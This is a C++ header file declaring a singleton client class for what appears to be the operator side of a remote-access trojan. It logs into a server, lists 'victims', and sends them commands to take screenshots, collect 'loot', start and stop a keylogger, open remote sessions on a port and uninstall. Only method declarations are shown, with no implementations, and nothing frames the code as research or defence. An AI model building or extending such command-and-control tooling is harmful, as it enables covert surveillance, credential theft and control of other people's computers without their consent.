#pragma once

#include "Builder.hpp"
#include "Config.hpp"
#include "LogManager.hpp"
#include "CommandManager.hpp"
#include "VictimManager.hpp"
#include "SessionManager.hpp"

#include <cpppwn.hpp>

#include <string>


class Client {
private:
    Config& m_config;
    Builder& m_builder;

    LogManager& m_log_man;
    CommandManager& m_cmd_man;
    VictimManager& m_vic_man;
    SessionManager& m_sess_man;

    cpppwn::RESTClient m_rest_client;
    std::string m_status_text;

    size_t m_last_id;

    mutable size_t victim_count;

    void updateStatusText() noexcept;

public:
    // Delete copy and move constructors/assignments (singleton pattern)
    Client(const Client&) = delete;
    Client& operator=(const Client&) = delete;
    Client(Client&&) = delete;
    Client& operator=(Client&&) = delete;
    explicit Client(const std::string& db_path = "client.db");

    static Client& instance(const std::string& db_path = "client.db");

    [[nodiscard]]
    bool hasServerSession() const noexcept;

    [[nodiscard]]
    std::string getUsername() const noexcept;

    [[nodiscard]]
    std::string getPassword() const noexcept;

    [[nodiscard]]
    std::string getServerUrl() const noexcept;

    [[nodiscard]]
    std::string getServerHost() const noexcept;

    [[nodiscard]]
    std::string getTimeout() const noexcept;

    [[nodiscard]]
    std::string getOutputPath() const noexcept;

    void setUsername(const std::string& username) noexcept;

    void setPassword(const std::string& password) noexcept;

    void setServerUrl(const std::string& server_url) noexcept;

    void setTimeout(const std::string& timeout) noexcept;

    void setOutputPath(const std::string& output_path) noexcept;

    const char* getStatusText() const noexcept;

    const std::vector<Victim>& getVictims() const noexcept;

    // REST Methods
    [[nodiscard]] bool login() noexcept;

    [[nodiscard]] bool fetchVictims() noexcept;

    [[nodiscard]] bool sendTimeoutCommand(const UUID& client_id, int timeout);

    [[nodiscard]] bool sendOpenSessionCommand(const UUID& client_id, int64_t port);

    [[nodiscard]] bool sendCloseSessionCommand(const UUID& client_id);

    [[nodiscard]] bool sendScreenshotCommand(const UUID& client_id);

    [[nodiscard]] bool sendLootCommand(const UUID& client_id);

    [[nodiscard]] bool sendStartKeyloggerCommand(const UUID& client_id);

    [[nodiscard]] bool sendStopKeyloggerCommand(const UUID& client_id);

    [[nodiscard]] bool sendUninstallCommand(const UUID& client_id);

    [[nodiscard]] bool sendTimeoutCommand(int64_t client_id, int timeout);

    [[nodiscard]] bool sendOpenSessionCommand(int64_t client_id, int64_t port);

    [[nodiscard]] bool sendCloseSessionCommand(int64_t client_id);

    [[nodiscard]] bool sendScreenshotCommand(int64_t client_id);

    [[nodiscard]] bool sendLootCommand(int64_t client_id);

    [[nodiscard]] bool sendStartKeyloggerCommand(int64_t client_id);

    [[nodiscard]] bool sendStopKeyloggerCommand(int64_t client_id);

    [[nodiscard]] bool sendUninstallCommand(int64_t client_id);

    // Logs
    [[nodiscard]] bool fetchLogs() noexcept;
    [[nodiscard]] bool sendLogBuffer();

    // Victim Templates
    [[nodiscard]] bool registerTemplate(const std::string& username, const std::string& password);
};